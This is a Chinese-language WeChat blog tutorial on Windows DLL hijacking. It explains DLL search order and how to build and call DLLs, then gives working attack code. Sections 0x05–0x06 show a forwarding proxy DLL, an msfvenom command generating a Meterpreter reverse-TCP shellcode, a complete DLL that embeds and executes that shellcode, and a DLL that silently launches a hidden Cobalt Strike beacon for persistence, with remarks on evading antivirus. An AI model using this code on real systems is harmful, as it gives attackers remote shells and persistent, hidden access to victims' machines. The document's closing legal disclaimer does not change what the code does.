> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Qd6p6cQu1lOSMq7W-_qdnQ)

  点击蓝字关注我哦

  

DLL 劫持原理学习

**0x01 什么是 DLL？**
-----------------

**百度百科：**

DLL(Dynamic Link Library) 文件为动态链接库文件，又称 “应用程序拓展”，是软件文件类型。在 Windows 中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即 DLL 文件，放置于系统中。当我们执行某一个程序时，相应的 DLL 文件就会被调用。一个应用程序可使用多个 DLL 文件，一个 DLL 文件也可能被不同的应用程序使用，这样的 DLL 文件被称为共享 DLL 文件。

**简而言之：**

DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现 “打开” 对话框。这有助于促进代码重用和内存的有效使用。

**0x02 程序运行时 DLL 的加载顺序**
------------------------

*   Windows XP SP2 之前  
    Windows 查找 DLL 的目录以及对应的顺序：
    

1.  进程对应的应用程序所在目录；
    
2.  当前目录（Current Directory）；
    
3.  系统目录（通过 GetSystemDirectory 获取）；
    
4.  16 位系统目录；
    
5.  Windows 目录（通过 GetWindowsDirectory 获取）；
    
6.  PATH 环境变量中的各个目录；
    

栗子 ：对于文件系统, 如 doc 文档打开会被应用程序 office 打开，而 office 运行的时候会加载系统的一个 dll 文件，如果我们将用恶意的 dll 来替换系统的 dll 文件，就是将 DLL 和 doc 文档放在一起，运行的时候就会在当前目录中找到 DLL，从而优先系统目录下的 DLL 而被执行。

*   在 Windows xp sp2 之后
    

Windows 查找 DLL 的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：

默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为 1

1.  进程对应的应用程序所在目录（可理解为程序安装目录比如 C:ProgramFilesuTorrent）；
    
2.  系统目录（即 %windir%system32）；
    
3.  16 位系统目录（即 %windir%system）；
    
4.  Windows 目录（即 %windir%）；
    
5.  当前目录（运行的某个文件所在目录，比如 C:DocumentsandSettingsAdministratorDesktoptest）；
    
6.  PATH 环境变量中的各个目录；
    

*   Windows7 以上
    

系统没有了 SafeDllSearchMode 而采用 KnownDLLs，那么凡是此项下的 DLL 文件就会被禁止从 EXE 自身所在的目录下调用，而只能从系统目录即 SYSTEM32 目录下调用，其注册表位置：

计算机 \ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

那么最终 Windows2003 以上以及 win7 以上操作系统通过 “DLL 路径搜索目录顺序” 和“KnownDLLs 注册表项”的机制来确定应用程序所要调用的 DLL 的路径，之后，应用程序就将 DLL 载入了自己的内存空间，执行相应的函数功能。

1.  进程对应的应用程序所在目录（可理解为程序安装目录比如 C:ProgramFilesuTorrent）；
    
2.  系统目录（即 %windir%system32）；
    
3.  16 位系统目录（即 %windir%system）；
    
4.  Windows 目录（即 %windir%）；
    
5.  当前目录（运行的某个文件所在目录，比如 C:DocumentsandSettingsAdministratorDesktoptest）；
    
6.  PATH 环境变量中的各个目录；
    

**0x03 编写 DLL**
---------------

vs2019 - 动态链接库项目

每个 dll 都一个 dllmian.cpp 源文件，默认如下：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule, // 模块句柄
                       DWORD  ul_reason_for_call, // 调用原因
                       LPVOID lpReserved // 参数保留
                     )
{
    switch (ul_reason_for_call) // 根据调用原因选择不不同的加载方式
    {
    case DLL_PROCESS_ATTACH: // DLL被某个程序加载
    case DLL_THREAD_ATTACH: // DLL被某个线程加载
    case DLL_THREAD_DETACH: // DLL被某个线程卸载
    case DLL_PROCESS_DETACH: //DLL被某个程序卸载
        break;
    }
    return TRUE;
}
```

头文件：framework.h

```
#pragma once

#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
```

pch.h

```
// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头
#include "framework.h"

#endif //PCH_H
```

举个栗子：

引入 windows.h , 使用 messagebox 函数做一个 demo：

dllmain.cpp

```
#include "pch.h"
#include "windows.h"
int add(int x,int y) {
return(x + y);

}
void message() {
    MessageBox(0, L"hello world", 0, 0);
}
```

Framework.h

```
#pragma once

#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>


// 这种声明方式是强制用c语言方式进行修饰，且用C的默认约定__cdecl方式。
// 这种方式编译产生的DLL中有两个导出函数：add,message。不加任何修饰。

extern "C" __declspec(dllexport) int add(int x,int y);
extern "C" __declspec(dllexport) void message(void);
```

生成—> 生成解决方案，得到 dll

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTN6RTMrgEia0Ipfyt8gc4pS5DDToib7VXV2GibicCVicaTtztxPs8Moo2yWicw/640?wx_fmt=png)

**0x04 调用 DLL**
---------------

### python 调用 DLL

```
import ctypes
dll = ctypes.CDLL("dll路径")
a=dll.func()
a
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTNSCQV2Du28p5Nvia3PlrJHEBmC8RWmhLsWFDvTHInTPpYQy4LkRveIWg/640?wx_fmt=png)

### c++ 加载时动态链接

```
#include "iostream"
using namespace std;
#pragma comment(lib,"C:\\Users\\bz\\source\\repos\\DLL_demo\\x64\\Release\\DLL_demo.lib")
extern "C" __declspec(dllimport) int add(int a, int b);
extern "C" __declspec(dllimport) void message();
int main() {
    cout << add(1, 2) << endl;
    message();

}
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTNcyRRQ86LdCUvOQ15ichN4ezyX1QVibgOKxias14Gw7fbibialD7Z6cictZcg/640?wx_fmt=png)

### c++ 运行时动态链接

```
#include <iostream>
#include <Windows.h>
using namespace std;
//定义一个函数类，
typedef int(*addfun)(int a, int b);
typedef void(*messagefun)();

int main()
{   //指定加载dll库
    HMODULE hdll = LoadLibrary(LPCWSTR(L"DLL_demo.dll"));
    if (hdll != NULL)
    {   //获取函数位置
        addfun add = (addfun)GetProcAddress(hdll, "add");
        messagefun message = (messagefun)GetProcAddress(hdll, "message");
        if (add != NULL)
        {
            cout << add(1, 2) << endl;
           // system("pause");

        }
        if (add = NULL) {
            printf("获取函数失败");
           // system("pause");

        }
        if (message!= NULL) 
        {
            message();
        }
        FreeLibrary(hdll);
    }
    else 
    {
        printf("获取句柄失败");
        system("pause");
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTNiaMU926f36Ea73maIibQXbc4eVkEbtVe77e8K4bTFzeJCibhibfdsPeqtw/640?wx_fmt=png)

**0x05 转发式 DLL 劫持**
-------------------

简而言之，不影响程序 本身功能的同时执行恶意 dll

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTNTkg6pjq1SQBmnHibQwEZyjcyb2L93YxhompmM7kFun1ZkKHiapKGPLLw/640?wx_fmt=png)

举个栗子：

将原来的 dll 名写在转发方法里，然后将生成的 dll 文件重命名为劫持的 dll 文件名：

```
#include "pch.h"
#include "windows.h"
//开始转发，将函数方法转发
//导出函数
#pragma comment(linker,"/EXPORT:add=testdll.add,@1")
#pragma commnet(linker,"/EXPORT:message=testdll.message,@2")
//入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        MessageBox(NULL, L"hacked by cxk", L"hi", MB_OK);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {

    }

    return TRUE;
}
```

然后将 dll 放在 exe 同一目录，已经劫持成功了：

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTNRyFp7aLV29dblSmyhnXthl1rszlaXGq1AOQKWNmmyZPPe0ibOW5CJaA/640?wx_fmt=png)

0x06 使用 DLL 劫持上线主机
------------------

### dll 加载 shellcode 上线

生成 shellcode：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.20.10.6 -b '\xfc\xe8' lport=4444 -f c
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtzTxCD2DBbTsxZicFKnPfTN7s0iaSBjmLZpPquV8cCwPSQBrRrgZNM8V8yT2PfVxTYYBlBTlib4bW0w/640?wx_fmt=png)

生成 dll：

```
#include "pch.h"
#include "windows.h"
//开始转发，将函数方法转发
//导出函数
#pragma comment(linker,"/EXPORT:add=testdll.add,@1")
#pragma commnet(linker,"/EXPORT:message=testdll.message,@2")
//入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        unsigned char buf[] =
            "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
            "\xff\xff\x48\xbb\x66\x9a\x22\x85\x4f\xee\xee\xb7\x48\x31\x58"
            "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x9a\xd2\xa1\x61\xbf\x06"
            "\x22\xb7\x66\x9a\x63\xd4\x0e\xbe\xbc\xe6\x2e\xab\xf0\xd3\x2a"
            "\xa6\x65\xe5\x06\xd2\xa9\xd7\x57\xa6\x65\xe5\x46\xd7\x13\x4c"
            "\x07\x65\x9c\xe7\x2e\x95\x95\xcf\x05\xa6\xdf\x77\xca\xa6\x43"
            "\xf9\x4d\xc2\xce\xf6\xa7\x53\x2f\xc4\x4e\x2f\x0c\x5a\x34\xdb"
            "\x73\xcd\xc4\xbc\xce\x3c\x24\xa6\x6a\x84\x9f\x88\x6f\xcf\x7e"
            "\x91\x20\x8a\xca\x9c\xee\xb7\x66\x11\xa2\x0d\x4f\xee\xee\xff"
            "\xe3\x5a\x56\xe2\x07\xef\x3e\x3c\x2e\x82\x72\xc1\xc4\xae\xce"
            "\xfe\x67\x4a\xc1\xd3\x07\x11\x27\xf6\xed\xae\xaa\xc8\x7e\x27"
            "\xa6\xb6\xb0\xd2\x13\x45\xe3\xaf\x2f\x7e\x6b\xdb\x23\x44\x77"
            "\x0e\x9b\x46\x2a\x99\x6e\xa1\x47\xab\xd7\x66\x13\x42\x7a\xc1"
            "\xc4\xae\xca\xfe\x67\x4a\x44\xc4\xc4\xe2\xa6\xf3\xed\xda\x3e"
            "\xcc\x4e\x3e\xaf\x3c\x62\x12\x63\xdd\x07\xef\x3e\xf6\x3e\xc4"
            "\x7b\xdf\x0e\xb6\xaf\xee\x27\xc0\x6a\x06\xa3\xce\xaf\xe5\x99"
            "\x7a\x7a\xc4\x16\xb4\xa6\x3c\x74\x73\x69\x7a\xb0\x11\xb3\xfe"
            "\xd8\xed\x51\xb7\x10\xdd\xdc\xb7\x66\xdb\x74\xcc\xc6\x08\xa6"
            "\x36\x8a\x3a\x23\x85\x4f\xa7\x67\x52\x2f\x26\x20\x85\x5e\xb2"
            "\x42\xa3\x6c\x9c\x63\xd1\x06\x67\x0a\xfb\xef\x6b\x63\x3f\x03"
            "\x99\xc8\xb0\x99\x4f\x6e\x0c\xa5\x86\xef\xb6\x66\x9a\x7b\xc4"
            "\xf5\xc7\x6e\xdc\x66\x65\xf7\xef\x45\xaf\xb0\xe7\x36\xd7\x13"
            "\x4c\x02\xdf\x2e\xff\x99\x5a\x6a\x0c\x8d\xa6\x11\x77\x2e\x13"
            "\xe3\xc4\xf5\x04\xe1\x68\x86\x65\xf7\xcd\xc6\x29\x84\xa7\x27"
            "\xc2\x6e\x0c\xad\xa6\x67\x4e\x27\x20\xbb\x20\x3b\x8f\x11\x62"
            "\xe3\x5a\x56\x8f\x06\x11\x20\xc2\x83\x72\xb1\x85\x4f\xee\xa6"
            "\x34\x8a\x8a\x6a\x0c\xad\xa3\xdf\x7e\x0c\x9e\x63\xdd\x07\x67"
            "\x17\xf6\xdc\x98\xfb\x4d\x10\x11\x3b\x34\x9e\x9a\x5c\xd0\x07"
            "\x6d\x2a\x97\x38\x13\xd4\xef\x0f\xaf\xb7\xdf\x66\x8a\x22\x85"
            "\x0e\xb6\xa6\x3e\x94\xd2\x13\x4c\x0e\x54\xb6\x13\x35\x7f\xdd"
            "\x50\x07\x67\x2d\xfe\xef\x5d\x6f\xb4\x86\xa7\x67\x47\x2e\x13"
            "\xf8\xcd\xc6\x17\xaf\x0d\x64\x43\xea\xda\xb0\x3b\x6d\x4f\x66"
            "\xe7\x0a\xdd\x0e\xb9\xb7\xdf\x66\xda\x22\x85\x0e\xb6\x84\xb7"
            "\x3c\xdb\x98\x8e\x60\xe1\xde\x48\xb3\xcd\x7b\xc4\xf5\x9b\x80"
            "\xfa\x07\x65\xf7\xcc\xb0\x20\x07\x8b\x99\x65\xdd\xcd\x4e\x2d"
            "\xa6\x9e\xa0\xd2\xa7\x73\x3a\x5a\xaf\x48\x81\xc2\x48\x85\x16"
            "\xa7\x29\x75\x96\x2f\x80\xd3\xb0\x3b\xee\xb7";
        size_t size = sizeof(buf);
        char* inject = (char*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(inject, buf, size);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
    }
    return TRUE;
}
```

Ps：这种直接生成的 dll 不免杀，实战中需要做免杀处理。

### dll 加载免杀马上线

首先给这个文件加一个隐藏属性:

```
attrib +h beacon.exe
```

接着采用 DLL 去加载这个木马，

代码如下：

```
#include "pch.h"
#include "windows.h"
//开始转发，将函数方法转发
//导出函数
#pragma comment(linker,"/EXPORT:add=testdll.add,@1")
#pragma commnet(linker,"/EXPORT:message=testdll.message,@2")
//入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(TEXT("path\\beacon.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }

    return TRUE;
}
```

然后后面直接去尝试加载就行了, 程序执行完的时候 (`DLL_PROCESS_DETACH`), 会自动加载我们的 cs 马。

说一下这种方案的好处, 就是 DLL 根本没有恶意操作, 所以肯定会免杀，但是你的木马文件要做好免杀，这种思路主要应用于通过劫持一些程序的 DLL, 然后实现隐蔽的重启上线，也就是权限持续维持，单单杀启动项对 DLL 进行权限维持的方式来说是没有用的。

参考文章：https://www.anquanke.com/post/id/232891#h2-12  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODuKK75wg0AnoibFiaUSRyYlmhIZ0mrzg9WCcWOtyblENWAOdHxx9BWjlJclPlVRxA1gHkkxRpyK2cpg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德